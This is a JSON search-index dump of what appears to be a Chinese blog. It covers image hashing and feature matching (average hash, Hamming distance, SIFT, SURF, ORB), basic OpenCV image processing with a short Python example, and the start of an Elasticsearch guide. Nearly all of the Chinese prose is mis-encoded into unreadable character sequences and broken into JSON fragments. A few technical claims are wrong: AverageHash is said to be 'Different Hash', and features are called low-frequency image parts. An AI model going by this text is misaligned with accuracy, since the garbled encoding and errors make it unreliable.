æœ¬æ–‡å°†ä¼šä»‹ç»å›¾åƒç›¸ä¼¼æ€§çš„ä¸¤å¤§æœ‰å…³æ¦‚å¿µï¼šå›¾åƒå“ˆå¸Œã€å›¾åƒç‰¹å¾ã€‚ ","date":"2019-03-14","objectID":"/image-similarity/:1:0","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"å›¾åƒå“ˆå¸Œ å›¾åƒé€šè¿‡ä¸€ç³»åˆ—çš„å˜æ¢å’Œå¤„ç†æœ€ç»ˆå¾—åˆ°çš„ä¸€ç»„å“ˆå¸Œå€¼ç§°ä¹‹ä¸ºå›¾åƒçš„å“ˆå¸Œå€¼ï¼Œè€Œä¸­é—´çš„å˜æ¢å’Œå¤„ç†è¿‡ç¨‹åˆ™ç§°ä¹‹ä¸ºå“ˆå¸Œç®—æ³•ã€‚ ä¸‹é¢ä»¥ Average Hash ç®—æ³•ä¸ºä¾‹æè¿°è¿™ä¸€åŸºæœ¬è¿‡ç¨‹ï¼š 1ã€Reduce size : å°†åŸå›¾å‹ç¼©åˆ° 8 x 8 å³ 64 åƒç´ å¤§å°ï¼Œå¿½ç•¥ç»†èŠ‚ã€‚ 2ã€Reduce color : ç°åº¦å¤„ç†å¾—åˆ° 64 çº§ç°åº¦å›¾åƒã€‚ 3ã€Average the colors : è®¡ç®— 64 çº§ç°åº¦å‡å€¼ã€‚ 4ã€Compute the bits : äºŒå€¼åŒ–å¤„ç†ï¼Œå°†æ¯ä¸ªåƒç´ ä¸ä¸Šä¸€æ­¥å‡å€¼æ¯”è¾ƒå¹¶åˆ†åˆ«è®°ä¸º 0 æˆ–è€… 1 ã€‚ 5ã€Construct the hash : æ ¹æ®ä¸Šä¸€æ­¥ç»“æœçŸ©é˜µæ„æˆä¸€ä¸ª 64 bit æ•´æ•°ï¼Œæ¯”å¦‚æŒ‰ç…§ä»å·¦åˆ°å³ã€ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºã€‚æœ€åå¾—åˆ°çš„å°±æ˜¯å›¾åƒçš„å‡å€¼å“ˆå¸Œå€¼ã€‚ å‚è€ƒï¼šhttp://www.hackerfactor.com/blog/?/archives/432-Looks-Like-It.html å¦‚æœä½ ç¨åŠ ç•™æ„ï¼Œå°±ä¼šå‘ç° Average Hash å‡å€¼å“ˆå¸Œç®—æ³•çš„å¤„ç†è¿‡ç¨‹ç›¸å½“ç®€å•ï¼Œä¼˜ç‚¹å°±æ˜¯è®¡ç®—é€Ÿåº¦å¿«ï¼Œç¼ºç‚¹å°±æ˜¯å±€é™æ€§æ¯”è¾ƒæ˜æ˜¾ã€‚ å½“ç„¶è®¡ç®—æœºè§†è§‰é¢†åŸŸå‘å±•åˆ°ç°åœ¨å·²ç»æœ‰äº†å¤šç§å›¾åƒå“ˆå¸Œç®—æ³•ï¼ŒOpenCV æ”¯æŒçš„å›¾åƒå“ˆå¸Œç®—æ³•åŒ…æ‹¬ï¼š AverageHash : ä¹Ÿå« Different Hash. PHash : Perceptual Hash. MarrHildrethHash : Marr-Hildreth Operator Based Hash. RadialVarianceHash : Image hash based on Radon transform. BlockMeanHash : Image hash based on block mean. ColorMomentHash : Image hash based on color moments. è¿™äº›å“ˆå¸Œç®—æ³•çš„å…·ä½“å®ç°è¿‡ç¨‹ä¸åœ¨æœ¬æ–‡çš„è®²è¿°èŒƒå›´å†…ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„æ˜¯ä»–ä»¬çš„å®é™…è¡¨ç°ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå·¦ä¸‹è§’æ ‡æ˜äº†å¦‚æ°´å°ã€æ¤’ç›å™ªå£°ã€æ—‹è½¬ã€ç¼©æ”¾ã€jpegå‹ç¼©ã€é«˜æ–¯å™ªå£°ã€é«˜æ–¯æ¨¡ç³Šã€å¯¹æ¯”åº¦ç­‰å¯¹æŠ—å½±å“ï¼Œå³ä¸‹è§’åˆ™æ˜¯å„ç§å“ˆå¸Œç®—æ³•ï¼Œåœ†é”¥ä½“çš„é«˜åº¦åˆ™ä»£è¡¨å“ˆå¸Œç®—æ³•å¯¹å„ç§å½±å“çš„æŠ—æ€§ï¼Œé«˜åº¦è¶Šé«˜è¯´æ˜æŠ—æ€§è¶Šé«˜ã€è¶Šèƒ½æˆåŠŸåŒ¹é…ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçš„å“ˆå¸Œç®—æ³•è¾“å‡ºçš„å“ˆå¸Œå€¼æ˜¯ä¸åŒçš„ï¼ˆåœ¨ OpenCV ä¸­ï¼‰ï¼Œè¿™é‡Œæ˜¯æŒ‡æ•°æ®ç±»å‹å’Œä½æ•°å¹¶ä¸å®Œå…¨ç›¸åŒï¼Œç»“æœè¶Šå¤æ‚éœ€è¦çš„è®¡ç®—æˆæœ¬ä¹Ÿå°±è¶Šé«˜ã€‚ ä¸‹é¢è¿ç”¨è¿™äº›å“ˆå¸Œç®—æ³•å¯¹æŸå¼ å›¾åˆ†åˆ«è®¡ç®—å…¶å“ˆå¸Œå€¼ï¼Œè§‚å¯Ÿä»–ä»¬çš„è¾“å‡ºç»“æœï¼š ä»ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒColorMomentHash æ¯”è¾ƒç‰¹åˆ«ï¼Œè¾“å‡ºçš„æ˜¯æµ®ç‚¹æ•°ï¼Œå®ƒä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªèƒ½å¤Ÿå¯¹æŠ—æ—‹è½¬çš„å“ˆå¸Œç®—æ³•ï¼Œä½†æ˜¯ä¹Ÿå±€é™äº -90 ~ 90 åº¦ã€‚ å›¾åƒçš„å“ˆå¸Œå€¼æå–å‡ºæ¥äº†ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•æ¯”è¾ƒä¸¤å¼ å›¾ç‰‡çš„ç›¸ä¼¼æ€§ï¼Ÿ ","date":"2019-03-14","objectID":"/image-similarity/:2:0","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"Hamming distance Hamming distance æ±‰æ˜è·ç¦»ï¼ŒæŒ‡çš„æ˜¯ä¸¤ä¸ªç­‰é•¿å­—ç¬¦ä¸²å¯¹åº”ä½ç½®ä¸åŒå­—ç¬¦çš„ä¸ªæ•°ã€‚ ä¾‹å¦‚ï¼š 1 0 1 1 1 0 1 1 0 0 1 0 0 1 æ±‰æ˜è·ç¦»ä¸º 2 ã€‚ ä¸¤å¼ å›¾ç‰‡ä¹‹é—´çš„ç›¸ä¼¼æ€§å¯ä»¥é€šè¿‡ä»–ä»¬çš„å“ˆå¸Œå€¼ä¹‹é—´çš„æ±‰æ˜è·ç¦»æ¥åˆ¤æ–­ï¼Œæ±‰æ˜è·ç¦»è¶Šå°åˆ™è¯´æ˜å›¾ç‰‡è¶Šç›¸ä¼¼ï¼ŒColorMomentHash é™¤å¤–ã€‚ å¦‚æœæˆ‘ä»¬çš„å›¾ç‰‡åœ¨ç™¾ä¸‡ä»¥ä¸Šé‡çº§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨å®é™…å·¥ç¨‹åº”ç”¨ä¸­å¿«é€Ÿæ‰¾åˆ°ç›¸ä¼¼çš„å›¾ç‰‡ï¼Ÿéš¾ç‚¹åœ¨äºæå–äº†æ‰€æœ‰å›¾ç‰‡æ„å»ºå“ˆå¸Œæ•°æ®é›†åå¦‚ä½•å­˜å‚¨ï¼Œå…¶æ¬¡å¦‚ä½•è¿›è¡Œç™¾ä¸‡æ¬¡æ¯”è¾ƒä¹Ÿå°±æ˜¯è®¡ç®—æ±‰æ˜è·ç¦»ã€‚ ç­”æ¡ˆæ˜¯æ„å»ºå€’æ’ç´¢å¼•ï¼Œä¾‹å¦‚ Elasticsearch å¯ä»¥è½»æ¾å®ç°ã€‚ä½†æ˜¯ ES å¹¶ä¸ç›´æ¥æ”¯æŒè®¡ç®—æ±‰æ˜è·ç¦»ï¼Œå¦„å›¾åˆ©ç”¨æ¨¡ç³ŠæŸ¥è¯¢ä½ ä¼šæ­»çš„å¾ˆæƒ¨ï¼Œè¿™é‡Œå¿…é¡»å˜é€šå¤„ç†ã€‚å†å›åˆ°æ±‰æ˜è·ç¦»çš„å®šä¹‰ä¸Šï¼Œå‡è®¾æˆ‘ä»¬çš„å›¾ç‰‡å“ˆå¸Œå€¼æ˜¯ 64 bit ä½çš„æ•°æ®ï¼Œå¦‚æœæŒ‰ç…§å®šä¹‰åˆ™éœ€è¦æ¯”è¾ƒ 64 æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å®Œå…¨å¯ä»¥å°†å“ˆå¸Œå€¼æ‹†åˆ†ï¼Œ64 = 8 x 8ï¼Œæ¯ 8 bit æ„æˆä¸€ä¸ªæ¯”è¾ƒå•å…ƒï¼Œè¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦æ¯”è¾ƒ 8 æ¬¡å³å¯ã€‚ä¸ºä»€ä¹ˆèƒ½æ‹†åˆ†ï¼Ÿå› ä¸ºæˆ‘ä»¬è®¤ä¸ºç›¸ä¼¼å›¾ç‰‡å³ä½¿ç»è¿‡æ‹†åˆ†åæ¯”è¾ƒä»ç„¶å…·æœ‰è¾ƒå¥½çš„åŒ¹é…æ€§ã€‚ æ˜¾ç„¶å“ˆå¸Œå€¼è¶Šå¤æ‚åˆ™æ¯”è¾ƒçš„æˆæœ¬è¶Šé«˜ï¼Œæ‰€ä»¥åœ¨å®é™…åº”ç”¨ä¸­æˆ‘ä»¬éœ€è¦ç»¼åˆä¸šåŠ¡éœ€æ±‚æ¥è€ƒé‡å…·ä½“é‡‡ç”¨å“ªç§å“ˆå¸Œç®—æ³•ã€‚ å›¾åƒå“ˆå¸Œçš„æ–¹å¼å…¶å®å¯ä»¥ç†è§£ä¸ºå›¾åƒæ•´ä½“ä¸Šçš„ç›¸ä¼¼æ€§ã€‚æ—¢ç„¶æœ‰æ•´ä½“ï¼Œé‚£ä¹ˆå°±æœ‰å±€éƒ¨ã€‚ ","date":"2019-03-14","objectID":"/image-similarity/:3:0","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"å›¾åƒç‰¹å¾ ã€Œä¸€åŒä¸¹å‡¤åŒè§’çœ¼ï¼Œä¸¤å¼¯æŸ³å¶åŠæ¢¢çœ‰ã€ï¼Œäººè„¸å¯ä»¥æœ‰ç‰¹å¾ï¼Œé‚£ä¹ˆå›¾åƒå‘¢ï¼Ÿå½“ç„¶ä¹Ÿæœ‰ï¼Œåªè¦å›¾åƒå…·æœ‰ç±»ä¼¼çš„ç‰¹å¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®¤ä¸ºä»–ä»¬æ˜¯ç›¸ä¼¼çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯å±€éƒ¨ç›¸ä¼¼æ€§ï¼š ä¾‹å¦‚ä¸Šé¢å·¦å³ä¸¤å¼ å›¾ï¼Œç‰¹å¾åŒ¹é…ï¼Œå±€éƒ¨ç›¸ä¼¼ã€‚ ä»€ä¹ˆæ˜¯ç‰¹å¾ï¼Ÿç‰¹å¾ä¸€å®šæ˜¯å›¾ç‰‡çš„ä½é¢‘éƒ¨åˆ†ã€‚ ä¸Šå›¾ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæ˜¾ç„¶è“è‰²åœˆèƒ½åŒ¹é…æ›´å¤šï¼Œé»‘è‰²åœˆæ¬¡ä¹‹ï¼Œçº¢è‰²åœˆæœ€ä¸æ˜“åŒ¹é…ï¼Œå¦‚æœè¦é€‰æ‹©ä¸€ä¸ªä½œä¸ºç‰¹å¾ï¼Œå½“ç„¶å°±æ˜¯çº¢è‰²åœˆã€‚ Corner Detection : å›¾åƒç‰¹å¾æå–çš„åŸºç¡€ç®—æ³•ï¼Œç›®çš„åœ¨äºæå–å›¾åƒä¸­çš„ corner ï¼Œè¿™é‡Œçš„ corner å¯å¹¶ä¸æ˜¯å››ä¸ªè¾¹æ¡†è§’ï¼Œè€Œæ˜¯å›¾åƒä¸­çš„å…·æœ‰çªå˜ç‰¹å¾çš„ç‚¹ï¼Œä¾‹å¦‚ï¼š Corner detectors æœ€å¤§çš„ç¼ºç‚¹åœ¨äºæ— æ³•åº”å¯¹ä¼¸ç¼©æƒ…å†µï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ SIFT ç‰¹å¾æå–ç®—æ³•é—®ä¸–ï¼ŒSIFT çš„å…¨ç§°å³ Scale Invariant Feature Transform ã€‚ Keypoint å’Œ Descriptor ï¼škeypoint ä¹Ÿå°±æ˜¯å›¾åƒçš„ç‰¹å¾ç‚¹ï¼Œdescriptor åˆ™æ˜¯å¯¹åº”ç‰¹å¾ç‚¹çš„æè¿°å› å­ï¼Œåœ¨ OpenCV ä¸­ï¼Œkeypoint ä¹Ÿä¸€ç»„æµ®ç‚¹æ•°çŸ©é˜µï¼Œè¿™å¹¶ä¸åˆ©äºè®¡ç®—ï¼Œäºæ˜¯å¯ä»¥å°†å…¶è½¬æ¢ä¸ºäº†æ•´å½¢å€¼ä¹Ÿå°±æ˜¯ descriptor ï¼Œæ¯ä¸€ä¸ªç‰¹å¾ç‚¹çš„ descriptor æè¿°å› å­å°±æ˜¯ä¸€ä¸ªå¤šç»´å‘é‡ã€‚ SIFT æå–ç‰¹å¾ç‚¹ç¤ºä¾‹ï¼š éœ€è¦æ³¨æ„çš„æ˜¯ä¸€å¼ å›¾åƒçš„ç‰¹å¾ç‚¹æ˜¯æœ‰å¤šä¸ªçš„ã€‚ SIFT ç®—æ³•çš„ç¼ºç‚¹åœ¨äºè®¡ç®—é€Ÿåº¦å¤ªæ…¢ï¼ŒSIFT æ¯ä¸ªç‰¹å¾ç‚¹çš„ descriptor æœ‰ 128 ç»´ã€‚ä¸ºæ­¤ SURFï¼ˆ Speeded-Up Robust Features ï¼‰ç®—æ³•å¯¹å…¶è¿›è¡Œäº†åŠ é€Ÿä¼˜åŒ–ï¼ŒSURF ç‰¹å¾ç‚¹å¯ä»¥æ˜¯ 64 ç»´ï¼Œä¹Ÿå¯ä»¥è½¬æ¢ä¸º 128 ç»´ã€‚ SIFT å’Œ SURF ç®—æ³•éƒ½æ˜¯æœ‰ä¸“åˆ©çš„ï¼Œè¿™æ„å‘³ç€ä½ æœ‰è´£ä»»å’Œä¹‰åŠ¡å‘å…¶ä»˜è´¹ï¼Œç„¶è€Œ OpenCV å›¢é˜Ÿç»è¿‡è‡ªå·±çš„ç ”ç©¶æå‡ºäº†ä¸€ä¸ªæ›´å¿«é€Ÿä¼˜ç§€ä¸”å…è´¹çš„ ORB ï¼ˆ Oriented FAST and Rotated BRIEF ï¼‰ç®—æ³•ï¼Œæ¯ä¸ªç‰¹å¾ç‚¹æ›´åªæœ‰ 32 ç»´ï¼Œå‡å°‘äº†æ›´å¤šè®¡ç®—æˆæœ¬ã€‚ ç‰¹å¾ç‚¹æå–å‡ºæ¥äº†ï¼Œæ€ä¹ˆé€šè¿‡ç‰¹å¾ç‚¹å»æ¯”è¾ƒå›¾åƒçš„ç›¸ä¼¼æ€§ï¼Ÿä¸¤ä¸ªç‰¹å¾ç‚¹ä¹‹é—´çš„æ±‰æ˜è·ç¦»å°äºä¸€å®šç¨‹åº¦ï¼Œåˆ™æˆ‘ä»¬è®¤ä¸ºè¿™ä¸¤ä¸ªç‰¹å¾ç‚¹æ˜¯åŒ¹é…çš„ï¼Œæ¯å¼ å›¾åƒå¯ä»¥æå–å‡ºå¤šä¸ªç‰¹å¾ç‚¹ï¼ŒåŒ¹é…çš„ç‰¹å¾ç‚¹çš„ä¸ªæ•°è¾¾åˆ°æˆ‘ä»¬è®¾å®šçš„é˜ˆå€¼ï¼Œåˆ™æˆ‘ä»¬å°±å¯ä»¥è®¤ä¸ºè¿™ä¸¤å¼ å›¾ç‰‡æ˜¯ç›¸ä¼¼çš„ã€‚ ","date":"2019-03-14","objectID":"/image-similarity/:4:0","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"ç»“è¯­ ç›¸åŒå›¾åƒåƒç´ çº§åˆ«å®Œå…¨ç›¸åŒï¼Œç›¸ä¼¼å›¾ç‰‡åˆ™åˆ†ä¸ºä¸¤çº§ï¼Œå›¾åƒå“ˆå¸Œå¯¹åº”æ•´ä½“ç›¸ä¼¼ï¼Œå›¾åƒç‰¹å¾å¯¹åº”å±€éƒ¨ç›¸ä¼¼ã€‚ ","date":"2019-03-14","objectID":"/image-similarity/:5:0","tags":["Python","OpenCV"],"title":"å›¾åƒç›¸ä¼¼æ€§ï¼šå“ˆå¸Œå’Œç‰¹å¾","uri":"/image-similarity/"},{"categories":["Uncate"],"content":"å›¾åƒå¤„ç†åŸºç¡€","date":"2019-02-26","objectID":"/image-processing/","tags":["Python","OpenCV"],"title":"å›¾åƒå¤„ç†åŸºç¡€","uri":"/image-processing/"},{"categories":["Uncate"],"content":"å›¾åƒå¤„ç†åŸºç¡€ ç°å¦‚ä»Šæˆ‘ä»¬æ¯æ—¶æ¯åˆ»éƒ½åœ¨ä¸å›¾åƒæ‰“äº¤é“ï¼Œè€Œå›¾åƒå¤„ç†ä¹Ÿæ˜¯æˆ‘ä»¬ç»•ä¸å¼€çš„é—®é¢˜ï¼Œæœ¬æ–‡å°†ä¼šç®€è¿°å›¾åƒå¤„ç†çš„åŸºç¡€çŸ¥è¯†ä»¥åŠå¯¹å¸¸è§çš„è£å‰ªã€ç”»å¸ƒã€æ°´å°ã€å¹³ç§»ã€æ—‹è½¬ã€ç¼©æ”¾ç­‰å¤„ç†çš„å®ç°ã€‚ åœ¨è¿›è¡Œå›¾åƒå¤„ç†ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»è¦å…ˆå›ç­”è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼šä»€ä¹ˆæ˜¯å›¾åƒï¼Ÿ ç­”æ¡ˆæ˜¯åƒç´ ç‚¹çš„é›†åˆã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå‡è®¾çº¢è‰²åœˆçš„éƒ¨åˆ†æ˜¯ä¸€å¹…å›¾åƒï¼Œå…¶ä¸­æ¯ä¸€ä¸ªç‹¬ç«‹çš„å°æ–¹æ ¼å°±æ˜¯ä¸€ä¸ªåƒç´ ç‚¹ï¼ˆç®€ç§°åƒç´ ï¼‰ï¼Œåƒç´ æ˜¯æœ€åŸºæœ¬çš„ä¿¡æ¯å•å…ƒï¼Œè€Œè¿™å¹…å›¾åƒçš„å¤§å°å°±æ˜¯ 11 x 11 px ã€‚ 1ã€äºŒå€¼å›¾åƒï¼š å›¾åƒä¸­çš„æ¯ä¸ªåƒç´ ç‚¹åªæœ‰é»‘ç™½ä¸¤ç§çŠ¶æ€ï¼Œå› æ­¤æ¯ä¸ªåƒç´ ç‚¹çš„ä¿¡æ¯å¯ä»¥ç”¨ 0 å’Œ 1 æ¥è¡¨ç¤ºã€‚ 2ã€ç°åº¦å›¾åƒï¼š å›¾åƒä¸­çš„æ¯ä¸ªåƒç´ ç‚¹åœ¨é»‘è‰²å’Œç™½è‰²ä¹‹é—´è¿˜æœ‰è®¸å¤šçº§çš„é¢œè‰²æ·±åº¦ï¼ˆè¡¨ç°ä¸ºç°è‰²ï¼‰ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ 8 ä¸ª bit æ¥è¡¨ç¤ºç°åº¦çº§åˆ«ï¼Œå› æ­¤æ€»å…±æœ‰ 2 ^ 8 = 256 çº§ç°åº¦ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ 0 åˆ° 255 èŒƒå›´å†…çš„æ•°å­—æ¥å¯¹åº”è¡¨ç¤ºç°åº¦çº§åˆ«ã€‚ 3ã€RGBå›¾åƒï¼š çº¢ï¼ˆRedï¼‰ã€ç»¿ï¼ˆGreenï¼‰ã€è“ï¼ˆBlueï¼‰ä½œä¸ºä¸‰åŸè‰²å¯ä»¥è°ƒå’Œæˆä»»æ„çš„é¢œè‰²ï¼Œå¯¹äº RGB å›¾åƒï¼Œæ¯ä¸ªåƒç´ ç‚¹åŒ…å« RGB å…±ä¸‰ä¸ªé€šé“çš„åŸºæœ¬ä¿¡æ¯ï¼Œç±»ä¼¼çš„ï¼Œå¦‚æœæ¯ä¸ªé€šé“ç”¨ 8 bit è¡¨ç¤ºå³ 256 çº§ç°åº¦ï¼Œé‚£ä¹ˆä¸€ä¸ªåƒç´ ç‚¹å¯ä»¥è¡¨ç¤ºä¸ºï¼š ([0 ... 255], [0 ... 255], [0 ... 255]) å›¾åƒçŸ©é˜µï¼š æ¯ä¸ªå›¾åƒéƒ½å¯ä»¥å¾ˆè‡ªç„¶çš„ç”¨çŸ©é˜µæ¥è¡¨ç¤ºï¼Œæ¯ä¸ªåƒç´ å¯¹åº”çŸ©é˜µä¸­çš„æ¯ä¸ªå…ƒç´ ã€‚ ä¾‹å¦‚ï¼š 1ã€4 x 4 äºŒå€¼å›¾åƒï¼š 0 1 0 1 1 0 0 0 1 1 1 1 0 0 0 0 2ã€4 x 4 ç°åº¦å›¾åƒï¼š 156 255 0 14 12 78 94 134 240 55 1 11 0 4 50 100 3ã€4 x 4 RGB å›¾åƒï¼š (156, 22, 45) (255, 0, 0) (0, 156, 32) (14, 2, 90) (12, 251, 88) (78, 12, 34) (94, 90, 87) (134, 0, 2) (240, 33, 44) (55, 66, 77) (1, 28, 167) (11, 11, 11) (0, 0, 0) (4, 4, 4) (50, 50, 50) (100, 10, 10) åœ¨ç¼–ç¨‹è¯­è¨€ä¸­ä½¿ç”¨å“ªç§æ•°æ®ç±»å‹æ¥è¡¨ç¤ºçŸ©é˜µï¼Ÿç­”æ¡ˆæ˜¯å¤šç»´æ•°ç»„ã€‚ä¾‹å¦‚ä¸Šè¿° 4 x 4 RGB å›¾åƒå¯è½¬æ¢ä¸ºï¼š [ [ (156, 22, 45), (255, 0, 0), (0, 156, 32), (14, 2, 90) ], [ (12, 251, 88), (78, 12, 34), (94, 90, 87), (134, 0, 2) ], [ (240, 33, 44), (55, 66, 77), (1, 28, 167), (11, 11, 11) ], [ (0, 0, 0), (4, 4, 4), (50, 50, 50), (100, 10, 10) ] ] å›¾åƒå¤„ç†çš„æœ¬è´¨å®é™…ä¸Šå°±æ˜¯åœ¨å¤„ç†åƒç´ çŸ©é˜µå³åƒç´ å¤šç»´æ•°ç»„è¿ç®—ã€‚ ","date":"2019-02-26","objectID":"/image-processing/:0:0","tags":["Python","OpenCV"],"title":"å›¾åƒå¤„ç†åŸºç¡€","uri":"/image-processing/"},{"categories":["Uncate"],"content":"åŸºæœ¬å¤„ç†å®ç° å¯¹äºå›¾åƒçš„åŸºæœ¬å¤„ç†ï¼Œæœ¬æ–‡ç¤ºä¾‹ä½¿ç”¨çš„æ˜¯ opencv-python å’Œ numpy åº“ã€‚ ç¤ºä¾‹ï¼š # -*- coding: utf-8 -*- # å›¾åƒå¤„ç† import numpy as np import cv2 as cv img = cv.imread('../images/cat.jpg') # 333 x 500 rows, cols, channels = img.shape # 1ã€è£å‰ªï¼šåˆ‡å‰²çŸ©é˜µ cut = img[100:200, 333:444] # é€‰å–ç¬¬100åˆ°200è¡Œï¼Œç¬¬333åˆ°444åˆ—çš„åŒºé—´ # 2ã€ç”»å¸ƒï¼šå¡«å……çŸ©é˜µ background = np.zeros((600, 600, 3), dtype=np.uint8) # åˆ›å»º 600 x 600 é»‘è‰²ç”»å¸ƒ background[100:433, 50:550] = img # ç”»å¸ƒæŒ‡å®šåŒºåŸŸå¡«å……å›¾åƒ # 3ã€æ°´å°ï¼šåˆå¹¶çŸ©é˜µ # addWeighted å‚æ•°ï¼šsrc1, alpha, src2, beta, gamma # dst = src1 * alpha + src2 * beta + gamma; watermark = cv.imread('../images/node.jpg') # 600 x 800 watermark = watermark[200:533, 200:700]; dst = cv.addWeighted(watermark, 0.3, img, 0.7, 0); # ç¡®ä¿ç›¸åŒçš„ size å’Œ channel # 4ã€å¹³ç§» # shift (x, y), æ„å»ºå¹³ç§»å˜æ¢çŸ©é˜µ M: [[1, 0, tx], [0, 1, ty]], ç¼ºçœéƒ¨åˆ†å¡«å……é»‘è‰² M = np.array([[1, 0, -100], [0, 1, 100]], dtype=np.float32) shift = cv.warpAffine(img, M, (cols, rows)) # 5ã€æ—‹è½¬ # getRotationMatrix2D å‚æ•°ï¼š center ä¸­å¿ƒç‚¹ï¼Œangle æ—‹è½¬è§’åº¦ï¼Œscale ç¼©æ”¾ M = cv.getRotationMatrix2D(((cols-1)/2.0, (rows-1)/2.0), -60, 1) rotation = cv.warpAffine(img, M, (cols, rows)) # 6ã€ç¼©æ”¾ # resize å‚æ•°ï¼šsrc è¾“å…¥å›¾åƒï¼Œdsize è¾“å‡ºå›¾ç‰‡å¤§å°ï¼Œdst è¾“å‡ºå›¾åƒï¼Œfx æ°´å¹³æ–¹å‘ç¼©æ”¾ï¼Œfy å‚ç›´æ–¹å‘ç¼©æ”¾ï¼Œinterpolation ç¼©æ”¾ç®—æ³• resize = cv.resize(img, None, fx = 2, fy = 2, interpolation = cv.INTER_LINEAR) è£å‰ªï¼šåˆ‡å‰²çŸ©é˜µå³å¯ã€‚ ç”»å¸ƒï¼šå…ˆæ„å»ºæŒ‡å®šå¤§å°çš„ç”»å¸ƒèƒŒæ™¯ï¼Œå†å¡«å……å›¾åƒå³å¯ã€‚ æ°´å°ï¼šçŸ©é˜µåˆå¹¶è¿ç®—ï¼Œä½¿ç”¨ cv : addWeighted æ–¹æ³•ã€‚ å¹³ç§»ï¼šæ„å»ºå¹³ç§»å˜æ¢çŸ©é˜µï¼Œä½¿ç”¨ cv : warpAffine æ–¹æ³•ã€‚ æ—‹è½¬ï¼šæ„å»ºæ—‹è½¬å˜æ¢çŸ©é˜µï¼Œä½¿ç”¨ cv : warpAffine æ–¹æ³•ã€‚ ç¼©æ”¾ï¼šä½¿ç”¨ cv : resize æ–¹æ³•ã€‚ OpenCV æä¾›çš„ resize ç¼©æ”¾ç®—æ³•åŒ…æ‹¬ï¼š æ ¹æ®å®˜æ–¹çš„æ–‡æ¡£ï¼Œç¼©å°å›¾åƒæ—¶å»ºè®®ä½¿ç”¨ INTER_AREA ç®—æ³•ï¼Œæ”¾å¤§å›¾åƒæ—¶å»ºè®®ä½¿ç”¨ INTER_CUBICï¼ˆè¾ƒæ…¢ï¼‰ç®—æ³•æˆ–è€… INTER_LINEARï¼ˆæ›´å¿«æ•ˆæœä¹Ÿä¸é”™ï¼‰ç®—æ³•ã€‚ ","date":"2019-02-26","objectID":"/image-processing/:1:0","tags":["Python","OpenCV"],"title":"å›¾åƒå¤„ç†åŸºç¡€","uri":"/image-processing/"},{"categories":["Uncate"],"content":"ç»“è¯­ æœ¬æ–‡ä»‹ç»äº†å›¾åƒå¤„ç†çš„åŸºç¡€ï¼Œä»¥åŠé€šè¿‡ OpenCV å®ç°äº†å‡ ç§å¸¸è§çš„å›¾åƒå¤„ç†åŠŸèƒ½ã€‚ ","date":"2019-02-26","objectID":"/image-processing/:2:0","tags":["Python","OpenCV"],"title":"å›¾åƒå¤„ç†åŸºç¡€","uri":"/image-processing/"},{"categories":["Elasticsearch"],"content":"Elasticsearch å…¥é—¨æŒ‡å—","date":"2018-07-29","objectID":"/es-guide/","tags":["Elasticsearch"],"title":"Elasticsearch å…¥é—¨æŒ‡å—","uri":"/es-guide/"},{"categories":["Elasticsearch"],"content":"å¼•è¨€ Elasticsearch æ˜¯ä»€ä¹ˆï¼Ÿä¸€ä¸ªå¼€æºçš„å¯æ‰©å±•ã€é«˜å¯ç”¨ã€åˆ†å¸ƒå¼çš„å…¨æ–‡æœç´¢å¼•æ“ã€‚ ä½ ä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿã€Šäººç”Ÿä¸€ä¸²ã€‹ä¸­æœ‰è¿™æ ·ä¸€æ®µè¯ï¼š æ²¡äº†çƒŸç«æ°”ï¼Œäººç”Ÿå°±æ˜¯ä¸€æ®µå­¤ç‹¬çš„æ—…ç¨‹ã€‚ è€Œæˆ‘ä»¬å¦‚ä½•é€šè¿‡çƒŸç«æ°”ã€äººç”Ÿæˆ–è€…æ—…ç¨‹ç­‰è¿™æ ·çš„å…³é”®è¯æ¥æœç´¢å‡ºè¿™éƒ¨çºªå½•ç‰‡å‘¢ï¼Ÿæ˜¾ç„¶æ— è®ºæ˜¯ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ï¼Œè¿˜æ˜¯ NOSQL æ•°æ®åº“éƒ½æ— æ³•å®ç°è¿™æ ·çš„éœ€æ±‚ï¼Œè€Œè¿™é‡Œ Elasticsearch å°±æ´¾ä¸Šäº†ç”¨åœºã€‚ 